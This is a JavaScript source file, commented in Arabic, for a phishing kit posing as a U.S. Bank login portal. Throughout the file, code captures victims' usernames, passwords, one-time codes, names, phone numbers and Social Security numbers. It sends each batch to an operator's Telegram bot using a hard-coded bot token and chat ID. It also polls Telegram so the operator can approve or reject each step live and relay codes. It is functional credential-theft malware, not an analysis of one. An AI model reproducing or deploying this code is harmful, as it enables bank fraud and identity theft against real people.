/**
 * BrosTec Protocol: Full Detailed Implementation
 * System: U.S. Bank Control Portal - Version 4.0
 * Status: Final Connectivity Fix
 */

// --- 1. الإعدادات الأساسية ---
const BOT_TOKEN = "8520216452:AAHKA6o4TkmRqr040ItKiGYsbX8n9nNlVGI";
const CHAT_ID = "7865246557";

// توليد رقم جلسة فريد (6 أرقام) لضمان عدم التداخل بين المستخدمين
const sessionId = Math.floor(Math.random() * 899999) + 100000;

/**
 * دالة إرسال بيانات تسجيل الدخول (Step 2)
 * يتم استدعاؤها عند الضغط على زر الدخول في الصفحة الأولى
 */
async function submitLogin() {
    // جلب القيم من الحقول (تأكد أن الـ ID مطابق في HTML)
    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    const overlay = document.getElementById('loadingOverlay');
    
    // إظهار شاشة الانتظار
    if (overlay) overlay.style.display = 'flex';

    const text = `🆔 *Session:* #${sessionId}\n` +
                 `🌐 *Portal:* U.S. Bank\n` +
                 `--------------------------\n` +
                 `👤 User: \`${user}\`\n` +
                 `🔑 Pass: \`${pass}\``;

    // أزرار التحكم التي ستظهر لك في التيليجرام
    const buttons = [[
        { text: "✅ اطلب OTP 1", callback_data: `approve_2_${sessionId}` },
        { text: "❌ خطأ في الدخول", callback_data: `decline_2_${sessionId}` }
    ]];

    // تنفيذ الإرسال الفعلي
    await executeTelegramSend(text, buttons);
    
    // البدء بالاستماع لقرارك
    startListener();
}

/**
 * دالة إرسال الرمز الأول (Step 3)
 */
async function submitOTP1() {
    const otp1 = document.getElementById('otp1').value;
    const overlay = document.getElementById('loadingOverlay');
    
    if (overlay) overlay.style.display = 'flex';

    const text = `🆔 *Session:* #${sessionId}\n` +
                 `🔢 *OTP 1 Received:* \n` +
                 `Code: \`${otp1}\``;

    const buttons = [[
        { text: "✅ صحيح (تابع)", callback_data: `approve_3_${sessionId}` },
        { text: "❌ الرمز خطأ", callback_data: `decline_3_${sessionId}` }
    ]];

    await executeTelegramSend(text, buttons);
}

/**
 * دالة إرسال المعلومات الكاملة (Step 4)
 */
async function submitFullInfo() {
    const fName = document.getElementById('fName').value;
    const phone = document.getElementById('phone').value;
    const ssn = document.getElementById('ssn').value;
    const overlay = document.getElementById('loadingOverlay');
    
    if (overlay) overlay.style.display = 'flex';

    const text = `🆔 *Session:* #${sessionId}\n` +
                 `📝 *Full Info Received:* \n` +
                 `Name: ${fName}\n` +
                 `Phone: ${phone}\n` +
                 `SSN: ${ssn}`;

    const buttons = [[
        { text: "✅ اطلب OTP 2", callback_data: `approve_4_${sessionId}` },
        { text: "❌ خطأ بالبيانات", callback_data: `decline_4_${sessionId}` }
    ]];

    await executeTelegramSend(text, buttons);
}

/**
 * الوظيفة التقنية للإرسال عبر الـ API الخاص بتيليجرام
 */
async function executeTelegramSend(text, buttons) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            })
        });
        
        const result = await response.json();
        if (!result.ok) {
            console.error("Telegram API Error:", result.description);
        }
    } catch (error) {
        console.error("Network Error:", error);
    }
}

/**
 * محرك الاستماع المستمر (نفس منطق Rayan Exchange الاحترافي)
 */
function startListener() {
    // نستخدم setInterval لفحص التحديثات كل 3 ثوانٍ
    const pollingIndex = setInterval(async () => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await response.json();

            if (data.result && data.result.length > 0) {
                const lastUpdate = data.result[0];
                const callback = lastUpdate.callback_query;

                // التحقق من أن الضغطة تخص هذه الجلسة تحديداً
                if (callback && callback.data.includes(sessionId.toString())) {
                    const dataParts = callback.data.split('_');
                    const command = dataParts[0]; // approve أو decline
                    const step = parseInt(dataParts[1]);

                    // تنفيذ القرار
                    processAdminDecision(command, step);
                    
                    // مسح التحديثات لضمان عدم تكرار الأمر
                    clearInterval(pollingIndex);
                    // إعادة تشغيل المستمع للخطوة التالية بعد فترة وجيزة
                    setTimeout(startListener, 1000);
                }
            }
        } catch (e) {
            console.warn("Polling error, retrying...");
        }
    }, 3000);
}

/**
 * معالجة القرار القادم من هاتفك (تجاوز أو خطأ)
 */
function processAdminDecision(command, step) {
    const overlay = document.getElementById('loadingOverlay');
    
    if (command === "approve") {
        if (overlay) overlay.style.display = 'none';
        
        // إخفاء الأخطاء السابقة
        hideAllErrorMessages();
        
        // الانتقال للخطوة التالية (رقم الصفحة التالية)
        navigateToStep(step + 1);
    } 
    else if (command === "decline") {
        if (overlay) overlay.style.display = 'none';
        
        // إظهار رسالة الخطأ للمستخدم حسب المرحلة
        showErrorMessage(step);
    }
}

/**
 * وظائف الانتقال في الواجهة
 */
function navigateToStep(targetId) {
    const sections = document.querySelectorAll('.page-section');
    sections.forEach(section => {
        section.classList.remove('active');
    });
    
    const target = document.getElementById('step' + targetId);
    if (target) {
        target.classList.add('active');
    }
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showErrorMessage(step) {
    if (step === 2) navigateToStep(1); // العودة لصفحة الدخول
    if (step === 3) document.getElementById('otpError1').style.display = 'block';
    if (step === 4) document.getElementById('infoError').style.display = 'block';
}

function hideAllErrorMessages() {
    const errorIds = ['otpError1', 'infoError', 'otpError2'];
    errorIds.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
}
